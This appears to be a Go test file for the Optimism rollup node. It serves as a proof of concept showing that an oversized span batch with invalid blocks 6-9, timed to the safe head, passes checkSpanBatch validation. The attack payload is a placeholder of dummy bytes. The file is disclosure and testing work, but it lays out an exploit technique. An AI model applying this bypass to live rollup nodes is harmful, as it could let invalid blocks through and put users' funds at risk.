package derive

import (
	"context"
	"math/big"
	"testing"

	"github.com/ethereum-optimism/optimism/op-node/rollup"
	"github.com/ethereum-optimism/optimism/op-service/eth"
	"github.com/ethereum-optimism/optimism/op-service/testlog"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/log"
	"github.com/stretchr/testify/require"
)

// TestSpanBatchValidationBypass demonstrates the validation bypass
// where span batches with more blocks than expected can inject unvalidated blocks
func TestSpanBatchValidationBypass(t *testing.T) {
	log := testlog.Logger(t, log.LevelInfo)
	cfg := &rollup.Config{
		Genesis: rollup.Genesis{
			L2Time: 1000,
		},
		BlockTime:     2,
		SeqWindowSize: 1000,
		DeltaTime:     &[]uint64{0}[0], // Enable span batches
	}

	// Setup chain state
	// Safe head at block 105, time 1010
	l2SafeHead := eth.L2BlockRef{
		Hash:       common.Hash{0x05},
		Number:     105,
		Time:       1010,
		L1Origin:   eth.BlockID{Number: 100, Hash: common.Hash{0x64}},
		ParentHash: common.Hash{0x04},
	}

	// L1 block state
	l1Blocks := []eth.L1BlockRef{
		{Number: 100, Hash: common.Hash{0x64}, Time: 1000}, // l1Blocks[0] matches l2SafeHead.L1Origin
		{Number: 101, Hash: common.Hash{0x65}, Time: 1002},
	}

	l1InclusionBlock := eth.L1BlockRef{Number: 102, Hash: common.Hash{0x66}, Time: 1004}

	// Parent block calculation: block 99 at time 998
	// parentNum = 105 - (1010-1000)/2 - 1 = 105 - 5 - 1 = 99
	parentBlock := eth.L2BlockRef{
		Hash:       common.Hash{0x63},
		Number:     99,
		Time:       998,
		L1Origin:   eth.BlockID{Number: 94, Hash: common.Hash{0x5e}},
		ParentHash: common.Hash{0x62},
	}

	// Mock L2 fetcher with on-chain blocks 100-105
	l2Fetcher := &mockL2Fetcher{
		blocks:   make(map[uint64]eth.L2BlockRef),
		payloads: make(map[uint64]*eth.ExecutionPayloadEnvelope),
	}

	// Setup on-chain blocks 100-105 with valid data
	for i := uint64(0); i < 6; i++ {
		blockNum := uint64(100) + i
		blockTime := uint64(1000) + i*2
		epochNum := uint64(95) + i

		blockRef := eth.L2BlockRef{
			Hash:       common.Hash{byte(blockNum)},
			Number:     blockNum,
			Time:       blockTime,
			L1Origin:   eth.BlockID{Number: epochNum, Hash: common.Hash{byte(epochNum)}},
			ParentHash: common.Hash{byte(blockNum - 1)},
		}

		// Add L1 info deposit transaction
		txData := l1InfoDepositTx(t, epochNum)

		payload := &eth.ExecutionPayloadEnvelope{
			ExecutionPayload: &eth.ExecutionPayload{
				BlockNumber:  eth.Uint64Quantity(blockNum),
				Timestamp:    eth.Uint64Quantity(blockTime),
				BlockHash:    blockRef.Hash,
				ParentHash:   blockRef.ParentHash,
				Transactions: []eth.Data{txData},
			},
		}

		l2Fetcher.blocks[blockNum] = blockRef
		l2Fetcher.payloads[blockNum] = payload
	}

	// Also need parent block
	l2Fetcher.blocks[99] = parentBlock

	t.Run("legitimate_overlapping_batch", func(t *testing.T) {
		// Create legitimate span batch with 7 blocks (100-106)
		// Blocks 100-105 overlap with safe chain, block 106 is new
		legitimateBatches := make([]*SingularBatch, 7)
		for i := 0; i < 7; i++ {
			legitimateBatches[i] = &SingularBatch{
				ParentHash:   common.Hash{byte(99 + i)},
				EpochNum:     rollup.Epoch(95 + i),
				EpochHash:    common.Hash{byte(95 + i)},
				Timestamp:    uint64(1000 + i*2),
				Transactions: []eth.Data{},
			}
		}

		spanBatch := initializedSpanBatch(legitimateBatches, cfg.Genesis.L2Time, big.NewInt(1))

		result := checkSpanBatch(context.Background(), cfg, log, l1Blocks, l2SafeHead,
			spanBatch, l1InclusionBlock, l2Fetcher)

		// This should be accepted as a legitimate overlapping batch
		require.Equal(t, BatchValidity(BatchAccept), result, "legitimate batch should be accepted")
	})

	t.Run("oversized_overlapping_batch", func(t *testing.T) {
		// Create rogue span batch with 11 blocks instead of 7
		// Blocks 0-5: Match on-chain (pass overlapping validation)
		// Blocks 6-9: timestamp = 1010 (bypass per-block validation, but not accessed by overlapping loop)
		// Block 10: timestamp = 1012 (makes GetLastTimestamp() pass the initial check)
		maliciousBatches := make([]*SingularBatch, 11)

		// First 6 blocks: legitimate, match on-chain
		for i := 0; i < 6; i++ {
			maliciousBatches[i] = &SingularBatch{
				ParentHash:   common.Hash{byte(99 + i)},
				EpochNum:     rollup.Epoch(95 + i),
				EpochHash:    common.Hash{byte(95 + i)},
				Timestamp:    uint64(1000 + i*2),
				Transactions: []eth.Data{},
			}
		}

		// Blocks 6-9: will bypass validation
		// timestamp = 1010 (equal to l2SafeHead.Time)
		for i := 6; i < 10; i++ {
			maliciousBatches[i] = &SingularBatch{
				ParentHash: common.Hash{0xff}, // Invalid parent
				EpochNum:   rollup.Epoch(0),   // Invalid epoch (should be >= 100)
				EpochHash:  common.Hash{0x00}, // Invalid hash
				Timestamp:  1010,              // Equal to l2SafeHead.Time (bypass)
				Transactions: []eth.Data{
					// Malicious transaction (not validated!)
					{0x01, 0x02, 0x03},
				},
			}
		}

		// Block 10: timestamp = 1012 (makes GetLastTimestamp() >= nextTimestamp)
		maliciousBatches[10] = &SingularBatch{
			ParentHash:   common.Hash{byte(105)},
			EpochNum:     rollup.Epoch(101),
			EpochHash:    common.Hash{byte(101)},
			Timestamp:    1012,
			Transactions: []eth.Data{},
		}

		spanBatch := initializedSpanBatch(maliciousBatches, cfg.Genesis.L2Time, big.NewInt(1))

		result := checkSpanBatch(context.Background(), cfg, log, l1Blocks, l2SafeHead,
			spanBatch, l1InclusionBlock, l2Fetcher)

		// issue here that blocks 6-9 completely bypass validation!

		require.Equal(t, BatchValidity(BatchAccept), result,
			"Oversized batch accepted, blocks 6-9 bypassed validation")
	})

	t.Run("demonstrate_bypass", func(t *testing.T) {
		// Demonstrate that blocks 6-9 have completely invalid data
		// but still pass validation
		exploitBatches := make([]*SingularBatch, 11)

		// Blocks 0-5: Valid, match on-chain
		for i := 0; i < 6; i++ {
			exploitBatches[i] = &SingularBatch{
				ParentHash:   common.Hash{byte(99 + i)},
				EpochNum:     rollup.Epoch(95 + i),
				EpochHash:    common.Hash{byte(95 + i)},
				Timestamp:    uint64(1000 + i*2),
				Transactions: []eth.Data{},
			}
		}

		// Blocks 6-9: completely invalid data
		// Use epoch 0 (very old, should fail validation)
		for i := 6; i < 10; i++ {
			exploitBatches[i] = &SingularBatch{
				// All fields set to invalid values
				ParentHash: common.Hash{0xde, 0xad, 0xbe, 0xef}, // Wrong parent
				EpochNum:   rollup.Epoch(0),                     // Invalid old epoch
				EpochHash:  common.Hash{0xba, 0xad},             // Wrong epoch hash
				Timestamp:  1010,                                // At l2SafeHead.Time - this is bypass

				Transactions: []eth.Data{
					// Simulated malicious transaction data
					append([]byte{types.DynamicFeeTxType}, makeArbitraryTx()...),
				},
			}
		}

		// Block 10: timestamp = 1012 (makes GetLastTimestamp() pass)
		exploitBatches[10] = &SingularBatch{
			ParentHash:   common.Hash{byte(105)},
			EpochNum:     rollup.Epoch(101),
			EpochHash:    common.Hash{byte(101)},
			Timestamp:    1012,
			Transactions: []eth.Data{},
		}

		spanBatch := initializedSpanBatch(exploitBatches, cfg.Genesis.L2Time, big.NewInt(1))

		result := checkSpanBatch(context.Background(), cfg, log, l1Blocks, l2SafeHead,
			spanBatch, l1InclusionBlock, l2Fetcher)

		// CRITICAL: Accepts batch with completely invalid blocks 6-9
		require.Equal(t, BatchValidity(BatchAccept), result,
			"Batch with invalid epoch 0 blocks accepted!")
	})
}

// Mock L2 fetcher for testing
type mockL2Fetcher struct {
	blocks   map[uint64]eth.L2BlockRef
	payloads map[uint64]*eth.ExecutionPayloadEnvelope
}

func (m *mockL2Fetcher) L2BlockRefByNumber(ctx context.Context, number uint64) (eth.L2BlockRef, error) {
	if block, ok := m.blocks[number]; ok {
		return block, nil
	}
	return eth.L2BlockRef{}, NewTemporaryError(NotEnoughData)
}

func (m *mockL2Fetcher) PayloadByNumber(ctx context.Context, number uint64) (*eth.ExecutionPayloadEnvelope, error) {
	if payload, ok := m.payloads[number]; ok {
		return payload, nil
	}
	return nil, NewTemporaryError(NotEnoughData)
}

// Helper to create arbitrary transaction data
func makeArbitraryTx() []byte {
	// Simulated transaction that would manipulate state
	return []byte{
		0x01, 0x02, 0x03, 0x04, // Arbitrary data
		0xde, 0xad, 0xbe, 0xef, // More arbitrary data
		// ... real attack payload would go here
	}
}
